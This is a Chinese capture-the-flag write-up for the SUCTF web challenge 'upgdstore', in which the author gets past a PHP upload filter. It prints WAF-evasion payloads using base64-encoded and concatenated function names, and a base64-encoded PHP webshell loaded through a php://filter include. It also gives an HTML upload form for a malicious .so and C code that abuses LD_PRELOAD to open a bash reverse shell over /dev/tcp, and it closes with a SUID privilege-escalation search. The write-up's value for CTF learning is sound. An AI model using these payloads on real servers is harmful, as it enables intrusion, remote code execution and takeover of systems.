    <content type="html"><![CDATA[<h1 id="suctf-web-upgdstore"><a href="#suctf-web-upgdstore" class="headerlink" title="[suctf web] upgdstore"></a>[suctf web] upgdstore</h1><p>测试phpinfo没有被禁。</p><p>有waf然后想办法拿到index.php的源码发现，过滤好多东西。</p><p>文件包含类的函数被过滤了，highlight_file也没了。</p><p>下面写两种方法</p><h3 id="一、利用编码函数"><a href="#一、利用编码函数" class="headerlink" title="一、利用编码函数"></a>一、利用编码函数</h3><p>利用base64，或者rot13都可，来触发()();</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(base64_decode(&quot;c2hvd19zb3VyY2U=&quot;))(&#x27;../index.php&#x27;);</span><br></pre></td></tr></table></figure><h3 id="二、字符串拼接"><a href="#二、字符串拼接" class="headerlink" title="二、字符串拼接"></a>二、字符串拼接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo (&#x27;fil&#x27;.&#x27;e_get_contents&#x27;)(&#x27;index.php&#x27;);</span><br></pre></td></tr></table></figure><p>index.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;light&quot;&gt;&lt;span class=&quot;glow&quot;&gt;</span><br><span class="line">&lt;form enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; onsubmit=&quot;return checkFile()&quot;&gt;</span><br><span class="line">    嘿伙计，传个火？！</span><br><span class="line">    &lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;upload_file&quot;/&gt;</span><br><span class="line">    &lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;upload&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/span&gt;&lt;span class=&quot;flare&quot;&gt;&lt;/span&gt;&lt;div&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">function fun($var): bool&#123;</span><br><span class="line">    $blacklist = [&quot;\$_&quot;, &quot;eval&quot;,&quot;copy&quot; ,&quot;assert&quot;,&quot;usort&quot;,&quot;include&quot;, &quot;require&quot;, &quot;$&quot;, &quot;^&quot;, &quot;~&quot;, &quot;-&quot;, &quot;%&quot;, &quot;*&quot;,&quot;file&quot;,&quot;fopen&quot;,&quot;fwriter&quot;,&quot;fput&quot;,&quot;copy&quot;,&quot;curl&quot;,&quot;fread&quot;,&quot;fget&quot;,&quot;function_exists&quot;,&quot;dl&quot;,&quot;putenv&quot;,&quot;system&quot;,&quot;exec&quot;,&quot;shell_exec&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;proc_close&quot;, &quot;proc_get_status&quot;,&quot;checkdnsrr&quot;,&quot;getmxrr&quot;,&quot;getservbyname&quot;,&quot;getservbyport&quot;, &quot;syslog&quot;,&quot;popen&quot;,&quot;show_source&quot;,&quot;highlight_file&quot;,&quot;`&quot;,&quot;chmod&quot;];</span><br><span class="line"></span><br><span class="line">    foreach($blacklist as $blackword)&#123;</span><br><span class="line">        if(strstr($var, $blackword)) return True;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    return False;</span><br><span class="line">&#125;</span><br><span class="line">error_reporting(0);</span><br><span class="line">//设置上传目录</span><br><span class="line">define(&quot;UPLOAD_PATH&quot;, &quot;./uploads&quot;);</span><br><span class="line">$msg = &quot;Upload Success!&quot;;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">$temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">$file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">$ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line">if(!preg_match(&quot;/php/i&quot;, strtolower($ext)))&#123;</span><br><span class="line">die(&quot;只要好看的php&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$content = file_get_contents($temp_file);</span><br><span class="line">if(fun($content))&#123;</span><br><span class="line">    die(&quot;诶，被我发现了吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$new_file_name = md5($file_name).&quot;.&quot;.$ext;</span><br><span class="line">        $img_path = UPLOAD_PATH . &#x27;/&#x27; . $new_file_name;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        if (move_uploaded_file($temp_file, $img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;Upload Failed!&#x27;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        echo &#x27;&lt;div style=&quot;color:#F00&quot;&gt;&#x27;.$msg.&quot; Look here~ &quot;.$img_path.&quot;&lt;/div&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>waf过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;\$_&quot;, &quot;eval&quot;,&quot;copy&quot; ,&quot;assert&quot;,&quot;usort&quot;,&quot;include&quot;, &quot;require&quot;, &quot;$&quot;, &quot;^&quot;, &quot;~&quot;, &quot;-&quot;, &quot;%&quot;, &quot;*&quot;,&quot;file&quot;,&quot;fopen&quot;,&quot;fwriter&quot;,&quot;fput&quot;,&quot;copy&quot;,&quot;curl&quot;,&quot;fread&quot;,&quot;fget&quot;,&quot;function_exists&quot;,&quot;dl&quot;,&quot;putenv&quot;,&quot;system&quot;,&quot;exec&quot;,&quot;shell_exec&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;proc_close&quot;, &quot;proc_get_status&quot;,&quot;checkdnsrr&quot;,&quot;getmxrr&quot;,&quot;getservbyname&quot;,&quot;getservbyport&quot;, &quot;syslog&quot;,&quot;popen&quot;,&quot;show_source&quot;,&quot;highlight_file&quot;,&quot;`&quot;,&quot;chmod&quot;];</span><br></pre></td></tr></table></figure><h3 id="写入一句话木马"><a href="#写入一句话木马" class="headerlink" title="写入一句话木马"></a>写入一句话木马</h3><p>禁用的函数有点多，见下</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(base64_decode(&quot;ZXZhbA==&quot;))(base64_decode(&quot;ZXZhbCgkX1BPU1RbMV0pOw==&quot;));</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/a0814785886443bebac974e7f3afb51e.png" alt="img"></p><p>发现include没被过滤，然后发现也不行，看来其他设置给过滤了。</p><p>有点麻了啊寄了</p><p>现在写入还是上面的两种方法，要么编码，要么字符串拼接</p><p>看了atao师傅的解法，使用文件包含。</p><p>先写入一个base64过的一句话木马PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOz8+（这里有个坑，post的马不行，执行不了，只用通过get传参）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php Include(base64_decode(&quot;cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT1mM2I5NGU4OGJkMWJkMzI1YWY2ZjYyODI4Yzg3ODVkZC5waHA=&quot;));?&gt;</span><br></pre></td></tr></table></figure><p>接下来是绕过ban的函数</p><h3 id="传文件"><a href="#传文件" class="headerlink" title="传文件"></a>传文件</h3><p>这个传so文件着实费了一些时间，我真傻，真的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://f3c8af60-25b8-4d12-aab1-3a3289b9c5d0.node4.buuoj.cn:81/uploads/93bc3c03503d8768cf7cc1e39ce16fcb.php?1=move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;],&#x27;exp.so&#x27;);&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">&lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;upload_file&quot;/&gt;</span><br><span class="line">&lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;upload&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/42cf615eebc54eab933e91db7605f25a.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/b7edbb6594304bcfba23bb0f337a1e0f.png" alt="img"></p><p>能随便读写文件的话，我首先想的非预期</p><p><img src="https://img-blog.csdnimg.cn/eaa99c252f364f5ba7955ea23a8a889b.png" alt="img"></p><p>发现里面有函数被过滤了，但在我重写了两个函数之后我放弃了。</p><p>依然去做预期解，上传.so</p><h4 id="so"><a href="#so" class="headerlink" title="so"></a>so</h4><h5 id="ld-preload"><a href="#ld-preload" class="headerlink" title="ld_preload"></a>ld_preload</h5><p>今年来比较少考到，但是在红蓝攻防中很经常应用</p><p>需要对面满足条件是：对面没有禁用mail函数（可能这也是最近比赛不爱考这个的原因之一，如果禁用了mail，那等于就是考察别的点了，不禁用mail又一堆人用这个方法绕过，也很没有意思）</p><h5 id="php-gc"><a href="#php-gc" class="headerlink" title="php_gc"></a>php_gc</h5><p>从这两次公益赛来看这个都是考点（春秋和高校）两次的题目分别是：easy-thinking和php-uaf都是做到了代码执行却没有命令执行，所以通常步骤就是，利用蚁剑链接我们的shell代码执行，将下面的脚本写好命令传上去然后访问，利用phpgc进程Bypass 条件：php7.0 &lt; 7.3 (Unix)</p><p>这里的大家可以参考这个博客，里面有比较详细的脚本，因为太长了就不贴在这里了</p><p><a href="https://wulidecade.cn/2019/09/27/%E7%BB%95%E8%BF%87disable-function%E6%B1%87%E6%80%BB/">https://wulidecade.cn/2019/09/27/%E7%BB%95%E8%BF%87disable-function%E6%B1%87%E6%80%BB/</a></p><p>此处为ld_preload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void payload() &#123;</span><br><span class="line">system(&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/ip/port &lt;&amp;1&#x27;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int geteuid()</span><br><span class="line">&#123;</span><br><span class="line">if (getenv(&quot;LD_PRELOAD&quot;) == NULL) &#123; return 0; &#125;</span><br><span class="line">unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=putenv(&quot;LD_PRELOAD=/var/www/html/uploads/exp.so&quot;);mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;); </span><br></pre></td></tr></table></figure><p>成功反弹shell，cat显示没有权限，直接nl，能读。</p><p>不知道为甚么，又去看了atao师傅的解法，find / -user root -perm -4000 -print 2&gt;/dev/null</p><p>原来是suid提权，爱住了。</p><p><img src="https://img-blog.csdnimg.cn/677e94ca8bc7429ab1aeab9b763e746f.png" alt="img"></p><p>真的我哭死了。回头看这题真没那么难，但每一个点，都足够让你在尝试中，消耗大量时间，尤其是我这种菜鸡。</p><p><img src="https://img-blog.csdnimg.cn/4fb3fb87b292417bbdbae192fca675b7.png" alt="img"></p><p>disable_function</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zend_version, func_num_args, func_get_arg, func_get_args, strcmp, strncmp, strcasecmp, strncasecmp, each, error_log, defined, get_class, get_called_class, get_parent_class, method_exists, property_exists, class_exists, interface_exists, trait_exists, function_exists, class_alias, get_included_files, get_required_files, is_subclass_of, is_a, get_class_vars, get_object_vars, get_mangled_object_vars, get_class_methods, trigger_error, user_error, restore_error_handler, set_exception_handler, restore_exception_handler, get_declared_classes, get_declared_traits, get_declared_interfaces, get_defined_functions, get_defined_vars, create_function, get_resource_type, get_resources, get_loaded_extensions, extension_loaded, get_extension_funcs, get_defined_constants, debug_backtrace, debug_print_backtrace, gc_mem_caches, gc_collect_cycles, gc_enabled, gc_enable, gc_disable, gc_status, strtotime, date, idate, gmdate, mktime, gmmktime, checkdate, strftime, gmstrftime, time, localtime, getdate, date_create, date_create_immutable, date_create_from_format, date_create_immutable_from_format, date_parse, date_parse_from_format, date_get_last_errors, date_format, date_modify, date_add, date_sub, date_timezone_get, date_timezone_set, date_offset_get, date_diff, date_time_set, date_date_set, date_isodate_set, date_timestamp_set, date_timestamp_get, timezone_open, timezone_name_get, timezone_name_from_abbr, timezone_offset_get, timezone_transitions_get, timezone_location_get, timezone_identifiers_list, timezone_abbreviations_list, timezone_version_get, date_interval_create_from_date_string, date_interval_format, date_default_timezone_set, date_default_timezone_get, date_sunrise, date_sunset, date_sun_info, libxml_set_streams_context, libxml_use_internal_errors, libxml_get_last_error, libxml_clear_errors, libxml_get_errors, libxml_disable_entity_loader, libxml_set_external_entity_loader, openssl_get_cert_locations, openssl_spki_new, openssl_spki_verify, openssl_spki_export, openssl_spki_export_challenge, openssl_pkey_free, openssl_pkey_new, openssl_pkey_export, openssl_pkey_export_to_file, openssl_pkey_get_private, openssl_pkey_get_public, openssl_pkey_get_details, openssl_free_key, openssl_get_privatekey, openssl_get_publickey, openssl_x509_read, openssl_x509_free, openssl_x509_parse, openssl_x509_checkpurpose, openssl_x509_check_private_key, openssl_x509_verify, openssl_x509_export, openssl_x509_fingerprint, openssl_x509_export_to_file, openssl_pkcs12_export, openssl_pkcs12_export_to_file, openssl_pkcs12_read, openssl_csr_new, openssl_csr_export, openssl_csr_export_to_file, openssl_csr_sign, openssl_csr_get_subject, openssl_csr_get_public_key, openssl_digest, openssl_encrypt, openssl_decrypt, openssl_cipher_iv_length, openssl_sign, openssl_verify, openssl_seal, openssl_open, openssl_pbkdf2, openssl_pkcs7_verify, openssl_pkcs7_decrypt, openssl_pkcs7_sign, openssl_pkcs7_encrypt, openssl_pkcs7_read, openssl_private_encrypt, openssl_private_decrypt, openssl_public_encrypt, openssl_public_decrypt, openssl_get_md_methods, openssl_get_cipher_methods, openssl_get_curve_names, openssl_dh_compute_key, openssl_pkey_derive, openssl_random_pseudo_bytes, openssl_error_string, preg_match_all, preg_replace, preg_replace_callback, preg_replace_callback_array, preg_filter, preg_split, preg_quote, preg_grep, preg_last_error, readgzfile, gzrewind, gzclose, gzeof, gzgetc, gzgets, gzgetss, gzread, gzopen, gzpassthru, gzseek, gztell, gzwrite, gzputs, gzfile, gzcompress, gzuncompress, gzdeflate, gzinflate, gzencode, gzdecode, zlib_encode, zlib_decode, zlib_get_coding_type, deflate_init, deflate_add, inflate_init, inflate_add, inflate_get_status, inflate_get_read_len, ob_gzhandler, filter_input, filter_var, filter_input_array, filter_var_array, filter_list, filter_has_var, filter_id, hash, hash_file, hash_hmac, hash_hmac_file, hash_init, hash_update, hash_update_stream, hash_update_file, hash_final, hash_copy, hash_algos, hash_hmac_algos, hash_pbkdf2, hash_equals, hash_hkdf, mhash_keygen_s2k, mhash_get_block_size, mhash_get_hash_name, mhash_count, mhash, session_name, session_module_name, session_save_path, session_id, session_create_id, session_regenerate_id, session_decode, session_encode, session_start, session_destroy, session_unset, session_gc, session_set_save_handler, session_cache_limiter, session_cache_expire, session_set_cookie_params, session_get_cookie_params, session_write_close, session_abort, session_reset, session_status, session_register_shutdown, session_commit, sodium_crypto_aead_aes256gcm_is_available, sodium_crypto_aead_aes256gcm_decrypt, sodium_crypto_aead_aes256gcm_encrypt, sodium_crypto_aead_aes256gcm_keygen, sodium_crypto_aead_chacha20poly1305_decrypt, sodium_crypto_aead_chacha20poly1305_encrypt, sodium_crypto_aead_chacha20poly1305_keygen, sodium_crypto_aead_chacha20poly1305_ietf_decrypt, sodium_crypto_aead_chacha20poly1305_ietf_encrypt, sodium_crypto_aead_chacha20poly1305_ietf_keygen, sodium_crypto_aead_xchacha20poly1305_ietf_decrypt, sodium_crypto_aead_xchacha20poly1305_ietf_keygen, sodium_crypto_aead_xchacha20poly1305_ietf_encrypt, sodium_crypto_auth, sodium_crypto_auth_keygen, sodium_crypto_auth_verify, sodium_crypto_box, sodium_crypto_box_keypair, sodium_crypto_box_seed_keypair, sodium_crypto_box_keypair_from_secretkey_and_publickey, sodium_crypto_box_open, sodium_crypto_box_publickey, sodium_crypto_box_publickey_from_secretkey, sodium_crypto_box_seal, sodium_crypto_box_seal_open, sodium_crypto_box_secretkey, sodium_crypto_kx_keypair, sodium_crypto_kx_publickey, sodium_crypto_kx_secretkey, sodium_crypto_kx_seed_keypair, sodium_crypto_kx_client_session_keys, sodium_crypto_kx_server_session_keys, sodium_crypto_generichash, sodium_crypto_generichash_keygen, sodium_crypto_generichash_init, sodium_crypto_generichash_update, sodium_crypto_generichash_final, sodium_crypto_kdf_derive_from_key, sodium_crypto_kdf_keygen, sodium_crypto_pwhash, sodium_crypto_pwhash_str, sodium_crypto_pwhash_str_verify, sodium_crypto_pwhash_str_needs_rehash, sodium_crypto_pwhash_scryptsalsa208sha256, sodium_crypto_pwhash_scryptsalsa208sha256_str, sodium_crypto_pwhash_scryptsalsa208sha256_str_verify, sodium_crypto_scalarmult, sodium_crypto_secretbox, sodium_crypto_secretbox_keygen, sodium_crypto_secretbox_open, sodium_crypto_secretstream_xchacha20poly1305_keygen, sodium_crypto_secretstream_xchacha20poly1305_init_push, sodium_crypto_secretstream_xchacha20poly1305_push, sodium_crypto_secretstream_xchacha20poly1305_init_pull, sodium_crypto_secretstream_xchacha20poly1305_pull, sodium_crypto_secretstream_xchacha20poly1305_rekey, sodium_crypto_shorthash, sodium_crypto_shorthash_keygen, sodium_crypto_sign, sodium_crypto_sign_detached, sodium_crypto_sign_ed25519_pk_to_curve25519, sodium_crypto_sign_ed25519_sk_to_curve25519, sodium_crypto_sign_keypair, sodium_crypto_sign_keypair_from_secretkey_and_publickey, sodium_crypto_sign_open, sodium_crypto_sign_publickey, sodium_crypto_sign_secretkey, sodium_crypto_sign_publickey_from_secretkey, sodium_crypto_sign_seed_keypair, sodium_crypto_sign_verify_detached, sodium_crypto_stream, sodium_crypto_stream_keygen, sodium_crypto_stream_xor, sodium_add, sodium_compare, sodium_increment, sodium_memcmp, sodium_memzero, sodium_pad, sodium_unpad, sodium_bin2hex, sodium_hex2bin, sodium_bin2base64, sodium_base642bin, sodium_crypto_scalarmult_base, spl_classes, spl_autoload, spl_autoload_extensions, spl_autoload_register, spl_autoload_unregister, spl_autoload_functions, spl_autoload_call, class_parents, class_implements, class_uses, spl_object_hash, spl_object_id, iterator_to_array, iterator_count, iterator_apply, constant, bin2hex, hex2bin, sleep, usleep, time_nanosleep, time_sleep_until, strptime, flush, wordwrap, htmlspecialchars, htmlentities, html_entity_decode, htmlspecialchars_decode, get_html_translation_table, sha1, sha1_file, md5_file, crc32, iptcparse, iptcembed, getimagesize, getimagesizefromstring, image_type_to_mime_type, image_type_to_extension, phpversion, phpcredits, php_sapi_name, php_uname, php_ini_scanned_files, php_ini_loaded_file, strnatcmp, strnatcasecmp, substr_count, strspn, strcspn, strtok, strtoupper, ini_set, strpos, stripos, strrpos, strripos, strrev, hebrev, hebrevc, nl2br, basename, dirname, stripslashes, stripcslashes, stristr, strrchr, str_shuffle, str_word_count, str_split, strpbrk, substr_compare, utf8_encode, utf8_decode, strcoll, money_format, substr, substr_replace, quotemeta, ucfirst, lcfirst, ucwords, strtr, addslashes, addcslashes, rtrim, str_replace, str_ireplace, str_repeat, count_chars, chunk_split, trim, ltrim, strip_tags, similar_text, explode, implode, join, setlocale, localeconv, nl_langinfo, soundex, levenshtein, chr, ord, parse_str, str_getcsv, str_pad, chop, strchr, sprintf, printf, vprintf, vsprintf, fprintf, vfprintf, sscanf, fscanf, parse_url, urlencode, urldecode, rawurlencode, rawurldecode, http_build_query, readlink, linkinfo, symlink, link, unlink, exec, system, escapeshellcmd, passthru, shell_exec, proc_open, proc_close, proc_terminate, proc_get_status, proc_nice, rand, srand, getrandmax, mt_rand, mt_srand, mt_getrandmax, random_bytes, random_int, getservbyname, getservbyport, getprotobyname, getprotobynumber, getmyuid, getmygid, getmypid, getmyinode, getlastmod, password_hash, password_get_info, password_needs_rehash, password_verify, password_algos, convert_uuencode, convert_uudecode, abs, ceil, floor, round, sin, cos, tan, asin, acos, atan, atanh, atan2, sinh, cosh, tanh, asinh, acosh, expm1, log1p, pi, is_finite, is_nan, is_infinite, pow, exp, log, log10, sqrt, hypot, deg2rad, rad2deg, bindec, hexdec, octdec, decbin, decoct, dechex, base_convert, number_format, fmod, intdiv, inet_ntop, inet_pton, ip2long, long2ip, getenv, getopt, sys_getloadavg, microtime, gettimeofday, getrusage, hrtime, uniqid, quoted_printable_decode, quoted_printable_encode, convert_cyr_string, get_current_user, set_time_limit, header_register_callback, get_cfg_var, get_magic_quotes_gpc, get_magic_quotes_runtime, error_get_last, error_clear_last, call_user_func, call_user_func_array, forward_static_call, forward_static_call_array, serialize, unserialize, var_dump, var_export, debug_zval_dump, print_r, memory_get_usage, memory_get_peak_usage, register_shutdown_function, register_tick_function, unregister_tick_function, highlight_file, highlight_string, php_strip_whitespace, ini_get, ini_get_all, ini_alter, ini_restore, get_include_path, set_include_path, restore_include_path, setcookie, setrawcookie, header, header_remove, headers_sent, headers_list, http_response_code, connection_aborted, connection_status, ignore_user_abort, parse_ini_file, parse_ini_string, is_uploaded_file, gethostbyaddr, gethostbyname, gethostbynamel, gethostname, net_get_interfaces, dns_check_record, checkdnsrr, dns_get_mx, getmxrr, dns_get_record, intval, floatval, doubleval, strval, boolval, gettype, settype, is_null, is_resource, is_bool, is_int, is_float, is_integer, is_long, is_double, is_real, is_numeric, is_string, is_array, is_object, is_scalar, is_callable, is_iterable, is_countable, pclose, popen, readfile, rewind, rmdir, umask, fclose, feof, fgetc, fgets, fgetss, fread, fopen, fpassthru, ftruncate, fstat, fseek, ftell, fflush, fwrite, fputs, mkdir, rename, copy, tempnam, tmpfile, file, file_put_contents, stream_select, stream_context_create, stream_context_set_params, stream_context_get_params, stream_context_set_option, stream_context_get_options, stream_context_get_default, stream_context_set_default, stream_filter_prepend, stream_filter_append, stream_filter_remove, stream_socket_client, stream_socket_server, stream_socket_accept, stream_socket_get_name, stream_socket_recvfrom, stream_socket_sendto, stream_socket_enable_crypto, stream_socket_shutdown, stream_socket_pair, stream_copy_to_stream, stream_get_contents, stream_supports_lock, stream_isatty, fgetcsv, fputcsv, flock, get_meta_tags, stream_set_read_buffer, stream_set_write_buffer, set_file_buffer, stream_set_chunk_size, stream_set_blocking, socket_set_blocking, stream_get_meta_data, stream_get_line, stream_wrapper_register, stream_register_wrapper, stream_wrapper_unregister, stream_wrapper_restore, stream_get_wrappers, stream_get_transports, stream_resolve_include_path, stream_is_local, get_headers, stream_set_timeout, socket_set_timeout, socket_get_status, realpath, fnmatch, fsockopen, pfsockopen, pack, unpack, get_browser, crypt, opendir, closedir, chdir, getcwd, rewinddir, readdir, dir, scandir, glob, fileatime, filectime, filegroup, fileinode, filemtime, fileowner, fileperms, filesize, filetype, file_exists, is_writable, is_writeable, is_readable, is_executable, is_file, is_dir, is_link, stat, lstat, chown, chgrp, lchown, lchgrp, chmod, touch, clearstatcache, disk_total_space, disk_free_space, diskfreespace, realpath_cache_size, realpath_cache_get, ezmlm_hash, openlog, syslog, closelog, lcg_value, metaphone, ob_start, ob_flush, ob_clean, ob_end_flush, ob_end_clean, ob_get_flush, ob_get_clean, ob_get_length, ob_get_level, ob_get_status, ob_get_contents, ob_implicit_flush, ob_list_handlers, ksort, krsort, natsort, natcasesort, asort, arsort, sort, rsort, usort, uasort, uksort, shuffle, array_walk, array_walk_recursive, count, end, prev, next, reset, current, key, min, max, in_array, array_search, extract, compact, array_fill, array_fill_keys, range, array_multisort, array_push, array_pop, array_shift, array_unshift, array_splice, array_slice, array_merge, array_merge_recursive, array_replace, array_replace_recursive, array_keys, array_key_first, array_key_last, array_values, array_count_values, array_column, array_reverse, array_reduce, array_pad, array_flip, array_change_key_case, array_rand, array_unique, array_intersect, array_intersect_key, array_intersect_ukey, array_uintersect, array_intersect_assoc, array_uintersect_assoc, array_intersect_uassoc, array_uintersect_uassoc, array_diff, array_diff_key, array_diff_ukey, array_udiff, array_diff_assoc, array_udiff_assoc, array_diff_uassoc, array_udiff_uassoc, array_sum, array_product, array_filter, array_map, array_chunk, array_combine, array_key_exists, pos, sizeof, key_exists, assert, assert_options, version_compare, ftok, str_rot13, stream_get_filters, stream_filter_register, stream_bucket_make_writeable, stream_bucket_prepend, stream_bucket_append, stream_bucket_new, output_add_rewrite_var, output_reset_rewrite_vars, sys_get_temp_dir, apache_lookup_uri, virtual, apache_request_headers, apache_response_headers, apache_getenv, apache_note, apache_get_version, apache_get_modules, getallheaders, xxhash32, xxhash64, pdo_drivers, xml_parser_create, xml_parser_create_ns, xml_set_object, xml_set_element_handler, xml_set_character_data_handler, xml_set_processing_instruction_handler, xml_set_default_handler, xml_set_unparsed_entity_decl_handler, xml_set_notation_decl_handler, xml_set_external_entity_ref_handler, xml_set_start_namespace_decl_handler, xml_set_end_namespace_decl_handler, xml_parse, xml_parse_into_struct, xml_get_error_code, xml_error_string, xml_get_current_line_number, xml_get_current_column_number, xml_get_current_byte_index, xml_parser_free, xml_parser_set_option, xml_parser_get_option, jdtogregorian, gregoriantojd, jdtojulian, juliantojd, jdtojewish, jewishtojd, jdtofrench, gmp_prob_prime, gmp_gcd, gmp_gcdext, gmp_lcm, gmp_invert, gmp_jacobi, gmp_legendre, gmp_kronecker, gmp_cmp, gmp_sign, gmp_random, gmp_random_seed, gmp_random_bits, gmp_random_range, gmp_and, gmp_or, gmp_com, gmp_xor, gmp_setbit, gmp_clrbit, gmp_testbit, gmp_scan0, gmp_scan1, gmp_popcount, gmp_hamdist, gmp_nextprime, gmp_binomial, iconv, iconv_get_encoding, iconv_set_encoding, iconv_strlen, iconv_substr, iconv_strpos, iconv_strrpos, iconv_mime_encode, iconv_mime_decode, iconv_mime_decode_headers, json_encode, json_decode, json_last_error, json_last_error_msg, mb_convert_case, mb_strtoupper, mb_strtolower, mb_language, mb_internal_encoding, mb_http_input, mb_http_output, mb_detect_order, mb_substitute_character, mb_parse_str, mb_output_handler, mb_preferred_mime_name, mb_str_split, mb_strlen, mb_strpos, mb_strrpos, mb_stripos, mb_strripos, mb_strstr, mb_strrchr, mb_stristr, mb_strrichr, mb_substr_count, mb_substr, mb_strcut, mb_strwidth, mb_strimwidth, mb_convert_encoding, mb_detect_encoding, mb_list_encodings, mb_encoding_aliases, mb_convert_kana, mb_encode_mimeheader, mb_decode_mimeheader, mb_convert_variables, mb_encode_numericentity, mb_decode_numericentity, mb_send_mail, mb_get_info, mb_check_encoding, mb_ord, mb_chr, mb_scrub, mb_regex_encoding, mb_regex_set_options, mb_ereg, mb_eregi, mb_ereg_replace, mb_eregi_replace, mb_ereg_replace_callback, mb_split, mb_ereg_match, mb_ereg_search, mb_ereg_search_pos, mb_ereg_search_regs, mb_ereg_search_init, mb_ereg_search_getregs, mb_ereg_search_getpos, mb_ereg_search_setpos, mbregex_encoding, mbereg, mberegi, mbereg_replace, mberegi_replace, mbsplit, mbereg_match, mbereg_search, mbereg_search_pos, mbereg_search_regs, 